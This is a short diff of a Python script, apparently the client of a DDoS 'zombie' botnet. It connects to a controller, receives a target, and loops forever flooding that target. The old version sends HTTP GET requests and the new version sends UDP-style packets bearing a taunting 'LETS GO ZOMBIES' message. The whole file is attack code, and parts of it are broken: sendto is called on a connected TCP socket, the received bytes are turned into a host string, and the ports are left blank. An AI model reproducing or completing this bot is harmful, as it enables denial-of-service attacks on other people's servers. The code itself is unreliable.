@@ -1,11 +1,11 @@
 import socket
-import requests
-
-baglanilacakip= '' #ip giriniz buraya
-baglanilacakport= '' #port giriniz buraya
+import threading
+baglanilacakip= '' #bağlanılacak ip adresi
+baglanilacakport= '' #int tipinden bağlanılacak port
 
 soket= socket.socket()
 soket.connect((baglanilacakip,baglanilacakport))
-web= soket.recv(1024).decode()
+host= soket.recv(1024)
+port= '' #port gir
 while True:
- requests.get(url=web)
+ soket.sendto(b"LETS GO ZOMBIES!! ANTITRIX POWER ,RESPECT TO EMROVSKY", (str(host), int(port)))
